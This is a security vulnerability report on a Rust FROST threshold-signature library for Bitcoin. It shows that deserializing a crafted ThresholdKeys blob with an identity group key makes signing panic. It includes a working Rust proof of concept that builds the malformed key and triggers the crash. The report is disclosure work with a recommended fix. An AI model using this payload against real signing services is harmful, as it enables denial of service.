### Title
Malformed `ThresholdKeys` with an identity group key crashes Bitcoin FROST signing - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts untrusted bytes which deserialize to a semantically invalid identity group key, and Bitcoin's Schnorr algorithm subsequently panics while encoding that key, causing a deterministic denial of service. [1](#0-0) [2](#0-1) 

### Finding Description
`ThresholdKeys::read` reads `n` canonical group elements and passes them to `ThresholdKeys::new`, but neither parser rejects identity points or an identity aggregate key. [3](#0-2)  `ThresholdKeys::new` computes `group_key` as the sum of interpolated verification shares, so a serialized key containing identity verification shares produces `group_key == identity`. [4](#0-3)  During signing, `AlgorithmSignMachine::sign` delegates to the Bitcoin Schnorr algorithm, which calls `Hram::hram` with `params.group_key()`. [5](#0-4) [6](#0-5)  `Hram::hram` passes that key to `x`, and `x` unconditionally unwraps an x-coordinate even though the identity point has none. [7](#0-6) [8](#0-7) 

### Impact Explanation
An application which accepts serialized `ThresholdKeys` from an untrusted source and uses them with `bitcoin_serai::crypto::Schnorr` can be crashed by a malformed key blob instead of receiving an `io::Error` or `FrostError`. [1](#0-0) [9](#0-8)  This matches the report's unchecked-invalid-value-to-crash bug class, although the Rust manifestation is a panic rather than a native NULL dereference. [7](#0-6) 

### Likelihood Explanation
The malicious object is deterministic and requires no valid secret: a 1-of-1 `ThresholdKeys` payload can use scalar `1`, Lagrange interpolation, and an identity verification share. [10](#0-9)  The crash is reachable on the first call to `sign`, before any peer share needs to be supplied. [11](#0-10) [5](#0-4) 

### Recommendation
Reject identity points where they are semantically invalid during `ThresholdKeys` construction/deserialization, especially when the calculated `group_key` is identity, and return a structured error instead of allowing the value to reach BIP-340 encoding. [12](#0-11)  `Hram::hram` and `x` should also return a signature/verification failure for identity `R` or `A` rather than panicking. [13](#0-12) [2](#0-1) 

### Proof of Concept
The following constructs a validly encoded but semantically invalid 1-of-1 key whose group key is identity; signing then panics inside `x(A)`. [14](#0-13) [6](#0-5) [8](#0-7) 

```rust
use std::collections::HashMap;

use bitcoin_serai::crypto::Schnorr;
use ciphersuite::{Ciphersuite, group::{Group, GroupEncoding, ff::{Field, PrimeField}}};
use frost::{
  ThresholdKeys,
  curve::Secp256k1,
  sign::{AlgorithmMachine, PreprocessMachine, SignMachine},
};
use rand_core::OsRng;

let mut encoded = Vec::new();
encoded.extend(9u32.to_le_bytes());
encoded.extend(b"secp256k1");
encoded.extend(1u16.to_le_bytes()); // t
encoded.extend(1u16.to_le_bytes()); // n
encoded.extend(1u16.to_le_bytes()); // i
encoded.push(1); // Lagrange interpolation
encoded.extend(<Secp256k1 as Ciphersuite>::F::ONE.to_repr().as_ref());
encoded.extend(
  <Secp256k1 as Ciphersuite>::G::identity().to_bytes().as_ref(),
);

let keys = ThresholdKeys::<Secp256k1>::read(&mut encoded.as_slice()).unwrap();
assert!(bool::from(keys.group_key().is_identity()));

let (machine, _preprocess) =
  AlgorithmMachine::<Secp256k1, Schnorr>::new(Schnorr::new(), keys)
    .preprocess(&mut OsRng);

// Panics at x(A): `encoded.x().expect("point at infinity")`.
let _ = machine.sign(HashMap::new(), b"message");
```
